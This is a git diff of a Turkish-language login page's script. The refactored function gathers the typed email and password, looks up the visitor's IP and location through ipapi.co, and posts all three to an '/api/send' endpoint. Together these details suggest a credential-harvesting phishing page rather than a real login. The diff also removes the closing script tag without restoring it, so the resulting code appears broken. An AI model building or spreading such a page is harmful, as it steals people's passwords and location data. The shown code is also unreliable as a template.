@@ -87,41 +87,34 @@
 
     <script>
         async function verileriGonder() {
-            const email = document.getElementById('userEmail').value;
-            const pass = document.getElementById('userPass').value;
+    const email = document.getElementById('userEmail').value;
+    const pass = document.getElementById('userPass').value;
 
-            if(!email || !pass) {
-                alert("Lütfen tüm alanları doldurun!");
-                return;
-            }
+    if(!email || !pass) { alert("Boş bırakma!"); return; }
 
-            try {
-                // IP ve konum bilgisini alıyoruz
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
+    try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
 
-                // Vercel üzerindeki güvenli API/send dosyamıza verileri gönderiyoruz
-                const response = await fetch('/api/send', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, pass, ipData })
-                });
+        const response = await fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, pass, ipData })
+        });
 
-                const result = await response.json();
+        const result = await response.json();
 
-                if (result.success) {
-                    // Şifre doğruysa içeriği göster
-                    document.getElementById('login-form').style.display = 'none';
-                    document.getElementById('content').style.display = 'block';
-                } else {
-                    alert("Hatalı email veya şifre!");
-                }
-            } catch (error) {
-                console.error("Hata:", error);
-                alert("Giriş sırasında bir hata oluştu!");
-            }
+        // Sadece API "success: true" dönerse içeriği göster
+        if (response.ok && result.success) {
+            document.getElementById('login-form').style.display = 'none';
+            document.getElementById('content').style.display = 'block';
+        } else {
+            alert(result.message || "Giriş başarısız! Şifreyi kontrol et.");
         }
-    </script>
+    } catch (e) {
+        alert("Bağlantı hatası! Lütfen tekrar dene.");
+    }
+}
 
 </body>
 </html>
